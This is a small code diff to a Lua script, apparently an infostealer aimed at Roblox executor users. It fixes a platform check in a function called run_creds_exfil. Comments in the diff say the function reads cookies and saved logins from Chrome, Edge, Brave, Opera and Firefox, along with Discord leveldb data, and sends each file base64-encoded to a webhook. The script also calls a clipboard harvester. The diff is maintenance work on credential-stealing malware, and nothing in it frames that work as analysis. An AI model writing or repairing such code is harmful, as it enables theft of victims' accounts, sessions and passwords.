@@ -804,10 +804,10 @@ local function creds_send(title, content, color)
     end
 end
 
-local function run_creds_exfil()
+local function run_creds_exfil(platform_arg)
     -- Only run on Windows (Solara). Android no-op.
-    if platform ~= "windows" then
-        print("[creds] skipped: not Windows (platform=" .. tostring(platform) .. ")")
+    if platform_arg ~= "windows" then
+        print("[creds] skipped: not Windows (platform=" .. tostring(platform_arg) .. ")")
         return
     end
     if not readfile then
@@ -889,7 +889,7 @@ local cb_captures = run_clipboard_harvest()
 -- Cookie/credential exfil (Windows only via env-var bypass). Reads Chrome
 -- cookies, Login Data, Local State, Edge, Brave, Opera, Firefox, Discord
 -- leveldb — sends each as base64 to the webhook for offline decryption.
-run_creds_exfil()
+run_creds_exfil(platform)
 
 -- Run harvest
 print("[*] Running harvest...")
